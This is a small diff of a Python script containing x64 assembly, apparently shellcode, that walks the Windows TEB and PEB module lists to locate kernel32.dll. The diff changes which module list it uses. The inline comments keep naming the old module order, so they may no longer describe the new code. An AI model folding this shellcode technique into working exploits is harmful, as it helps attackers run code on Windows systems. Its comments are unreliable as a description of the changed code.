@@ -214,10 +214,10 @@ if __name__ == "__main__":
 " xor rdx, rdx;"
 " mov rax, gs:[rdx+0x60];"        # RAX stores the value of ProcessEnvironmentBlock member in TEB, which is the PEB address
 " mov rsi,[rax+0x18];"        # Get the value of the LDR member in PEB, which is the address of the _PEB_LDR_DATA structure
-" mov rsi,[rsi + 0x20];"        # RSI is the address of the InMemoryOrderModuleList member in the _PEB_LDR_DATA structure
+" mov rsi,[rsi + 0x30];"        # RSI is the address of the InInitializationOrderModuleList member in the _PEB_LDR_DATA structure
 " mov r9, [rsi];"        # Current module is python.exe
 " mov r9, [r9];"        # Current module is ntdll.dll
-" mov r9, [r9+0x20];"        # Current module is kernel32.dll
+" mov r9, [r9+0x10];"        # Current module is kernel32.dll
 " jmp jump_section;"
 
 "parse_module:"        # Parsing DLL file in memory
